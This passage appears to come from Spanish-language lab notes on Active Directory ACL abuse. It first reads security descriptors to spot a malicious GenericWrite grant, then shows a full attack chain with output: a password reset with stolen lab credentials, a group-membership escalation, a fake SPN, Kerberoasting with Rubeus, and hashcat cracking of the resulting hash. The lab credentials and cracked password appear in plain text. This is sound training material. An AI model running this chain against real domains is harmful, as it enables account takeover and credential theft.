cbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)" 

Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
                   AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
                   Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
                   WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
                   BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), INLANEFREIGHT\Domain Users:
                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
                   (Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

Si elegimos filtrar por la propiedad `DiscretionaryAcl`, podemos ver que la modificación probablemente estaba otorgando al usuario `mrb3n` privilegios `GenericWrite` sobre el objeto de dominio en sí, lo que podría ser indicativo de un intento de ataque.

```powershell
PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)" |select -ExpandProperty DiscretionaryAcl

Everyone: AccessDenied (WriteData)
Everyone: AccessAllowed (WriteExtendedAttributes)
NT AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, Traverse, WriteExtendedAttributes)
NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\Authenticated Users: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteAttributes, WriteExtendedAttributes)
BUILTIN\Pre-Windows 2000 Compatible Access: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\Domain Admins: AccessAllowed (ChangePermissions, CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteAttributes, WriteExtendedAttributes)
INLANEFREIGHT\Enterprise Admins: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
INLANEFREIGHT\Organization Management: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\Exchange Trusted Subsystem: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\mrb3n: AccessAllowed (CreateDirectories, GenericExecute, GenericWrite, ReadExtendedAttributes, ReadPermissions, Traverse, WriteExtendedAttributes)
```

Existen muchas herramientas que se pueden utilizar para ayudar a monitorear AD. Estas herramientas, cuando se utilizan junto con una postura de seguridad de AD altamente madura y se combinan con herramientas integradas, como las diversas formas en que podemos monitorear y alertar sobre eventos en Active Directory, pueden ayudar a detectar este tipo de ataques y evitar que sigan ocurriendo.

***

## <mark style="color:purple;">Caso práctico</mark>

Trabaja con los ejemplos de esta sección para comprender mejor el abuso de ACL y poner en práctica estas habilidades. Establece un SPN falso para la cuenta `adunn`, aplica Kerberoast al usuario y descifra el hash con Hashcat. Envía la contraseña en texto claro de la cuenta como respuesta.

#### Creación de objetos PSCredential y SecureString

<pre class="language-powershell"><code class="lang-powershell"><strong># Objeto PSCredential
</strong><strong>PS C:\Tools> $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
</strong>PS C:\Tools> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Objeto SecureString
PS C:\Tools> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
</code></pre>

#### Cambio de contraseña del usuario damundsen

```powershell
PS C:\Tools> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

#### Añadir damundsen al grupo privilegiado Help Desk Level 1

```powershell
PS C:\Tools> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
PS C:\Tools> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

#### Crear SPN Falso

```powershell
PS C:\Tools> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

#### Kerberoasting con Rubeus

```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$5738C6F11014E4AC9C10A06B25E59AFC$372061118B24C3E05B8672993A14A5ACCC2CDD45928AE4A6C3468D66BFF1C57A15DD07817DAB08297032A25336941DAA17F97A5CA420E82940C132B50B794CDF0AAEDBAA8315603B1351477D37B26FF1094CD250AF9CAE9AB6319E96BD665E9E5B834543C4AE2B471B623A06E776A8D48D9A27ADDA5AF9636A44BCDF8D5817847D1B33D4CFF0F39DBFF486D5CADBEC746AE695C1A685F6DBF616B0FF968A927236C33145C48ED7E4FAAEB58ED13134C08B66B700CB3DBBBD36ADF5DBC3066A9BC639EB87A64A16BB626249BB03E5164C7B69B8F34416BAB629391D816DA0D6B1E89420D54BB5E4D80B76F92F64F96D074C122812AC79D4B943BE28EEC157AFCB1B34CF47AECD047783DF3D54E86A8358484E2EBBC50DE20A794DA47AD26475431A4EA9C23B17F1F539DD119FE9541D8A8F3B082D4B547A1779B8240A8723FFBD263A557842E2EF98C4CF08D36E3E0656079049CE812A19F8C8F62D947A9FAD39D2344867113098456D65647A0A1265B20819CB140D1BE87D75EFEACE07164A36D9B477E88F52065C642E57A99F56F0BA095E3B3EBDB2019B89F4671D17876DDE66C3FD991DBA5BE33BD6793A11B0E58F30672F22D1D45FDD1DC7CA81F46C571423E118EF83961D35A24B261D93CEF49F6A707AEE5E86A1D07255D59EAB6951D55C49773CA336056D070CF5B7D493E2A1E1047C254BD1003241AB1F08F97DA767A12F8D4C206844F4879D7CA1F731F6A227584ECD9B7372A201E1848B9D97088301BB1E862987D08C68C1470C81A51C60B1A0CC71C1E4ACAF40416E17B29915B161F5CBD488CEFAE430105936C5B88887F04F5A66707ABC346A0A5B8EE957565C201E2A7CDB914E1C9B6CE861B491202D872B4F56C774316D693B8987BA86A3C9D76C05D47538A1BA80F600B28729EE9F3929D968FC354BF1787659B59CCC637ADDC4AC0EA679E23360B54974E293DA4F9EF0A0918F1D25AD95A9167C1DE9CF79D059A2D9134BECE84BFA366D9E88E3C1F3C83A164A0B206EEE43304CF953141718CADAE08E88A8DBAEAB64EFFC03B220EA2A9CDD1C916DD955BB29522A9B2C469AD0DC868AA40150BBA0175B84C8B09EC24A7210AE1ECC42B7BE648E603CF815A64C5D87FF5D5958CAEBBDB4B697DAD06ABF414C6A21347E92EB5E6E3D65387C6C18C6485F3B9900980A232591BDB7B4E14B4392E196338AAAD97405A0633D4F39B0B9E218A82EB30968DACD03626D66D1ECB1ABBE2D68263E71951FFF43E10B9D24F28ECD9510A92316BAB7CA1D52DB64E45BB2947A75CDD659E20D39EA78B875C19A0F8DF9B92637CC037C52B954E1A8E93206EC4E982398A47CE783C2090EEBCBF40C823EB3D03132DD43457709B18C1AE66788FE958DC8E243C35E29B3130D0326173117FB449FB8B2468FE87292CF072A0ECC66CDBAB9AF62CFE6DF7F1222DD6FB920C15D4B85619A5A0E5E96412D56E4EBAEFA23A904B33FAA55ECF1F3631F612BA4897A645AEC5F9823C05F18063DF19D36F452375652412666994FFF5EB682057245187EE67568266D83AB5AF873DF0B73C20B27EA7B87FCA38D3B94622EABABE4D693DCEA75F0E6FDB7312190517D92110F96B3EB014381AB67319334D29ADDE139B6869797A2047FEB805A8D6EA48965A7E89659
```

#### Cracking de hash con hashcat

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 13100 hash_adunn /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$5738c6f11014e4ac9c10a06b25e59afc$372061118b24c3e05b8672993a14a5accc2cdd45928ae4a6c3468d66bff1c57a15dd07817dab08297032a25336941daa17f97a5ca420e82940c132b50b794cdf0aaedbaa8315603b1<------SNIP------>
245187ee67568266d83ab5af873df0b73c20b27ea7b87fca38d3b94622eababe4d693dcea75f0e6fdb7312190517d92110f96b3eb014381ab67319334d29adde139b6869797a2047feb805a8d6ea48965a7e89659:SyncMaster757
                                                          
Session..........: hashcat
Status...........: Cracked
